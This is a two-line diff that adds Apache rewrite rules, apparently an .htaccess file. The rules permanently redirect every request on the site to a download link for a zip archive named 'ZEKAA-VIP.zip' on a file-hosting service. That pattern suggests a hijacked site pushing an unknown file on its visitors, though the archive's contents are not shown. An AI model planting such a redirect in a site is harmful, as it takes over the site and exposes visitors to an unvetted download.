@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^.*$ https://www.mediafire.com/file/fs4b4d67yvaisyd/ZEKAA-VIP.zip/file [R=301,L]
